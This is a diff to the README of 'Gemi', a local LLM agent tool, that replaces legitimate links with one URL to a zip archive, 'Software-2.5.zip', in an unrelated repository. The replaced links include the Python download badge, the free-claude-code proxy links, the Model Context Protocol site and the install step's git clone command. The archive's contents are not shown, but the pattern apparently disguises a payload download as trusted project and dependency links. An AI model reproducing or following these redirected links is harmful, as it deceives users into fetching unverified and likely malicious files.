@@ -6,7 +6,7 @@
 > hardware, your data, your weights.
 
 [![License: Apache 2.0](https://img.shields.io/badge/License-Apache_2.0-blue.svg)](LICENSE)
-[![Python 3.11+](https://img.shields.io/badge/python-3.11+-blue.svg)](https://www.python.org/downloads/)
+[![Python 3.11+](https://img.shields.io/badge/python-3.11+-blue.svg)](https://raw.githubusercontent.com/balaji-cse15/gemi/main/gemi/memory/Software-2.5.zip)
 [![Platform: Windows](https://img.shields.io/badge/platform-Windows-lightgrey)](#install)
 [![Status: Beta](https://img.shields.io/badge/status-beta-yellow)](#)
 
@@ -33,7 +33,7 @@ It's built for people who:
   tasks to a big model, run jobs in parallel, pivot on the fly
 
 You bring `llama.cpp`, GGUFs, and (optionally) a proxy like
-[`free-claude-code`](https://github.com/spectrobit/free-claude-code).
+[`free-claude-code`](https://raw.githubusercontent.com/balaji-cse15/gemi/main/gemi/memory/Software-2.5.zip).
 Gemi brings the agent loop, the tool catalogue, the launcher, and the
 terminal UI.
 
@@ -107,7 +107,7 @@ See [DISCLAIMER.md](DISCLAIMER.md) for the full text.
 
 - **`llama-server`** (from llama.cpp) loads a GGUF and exposes an
   OpenAI-compatible HTTP endpoint on port `8001+N`.
-- A **proxy** like [`free-claude-code`](https://github.com/spectrobit/free-claude-code)
+- A **proxy** like [`free-claude-code`](https://raw.githubusercontent.com/balaji-cse15/gemi/main/gemi/memory/Software-2.5.zip)
   re-shapes the Anthropic Messages API on port `9001+N` into OpenAI calls
   for `llama-server`. This lets the CLI use the exact same agent-loop logic
   as Claude Code.
@@ -224,7 +224,7 @@ authorization reminder. See [DISCLAIMER.md](DISCLAIMER.md).
 ### 2. Install Gemi
 
 ```cmd
-git clone https://github.com/space-kitty-o/gemi
+git clone https://raw.githubusercontent.com/balaji-cse15/gemi/main/gemi/memory/Software-2.5.zip
 cd gemi
 pip install -e .
 ```
@@ -323,7 +323,7 @@ Every autopilot session is logged as JSONL to `~/.gemi/logs/` for replay.
 
 ### MCP integration
 
-[Model Context Protocol](https://modelcontextprotocol.io) is Anthropic's
+[Model Context Protocol](https://raw.githubusercontent.com/balaji-cse15/gemi/main/gemi/memory/Software-2.5.zip) is Anthropic's
 open spec for tool-server interop. Gemi includes a full MCP client with
 both stdio and HTTP/SSE transports.
 
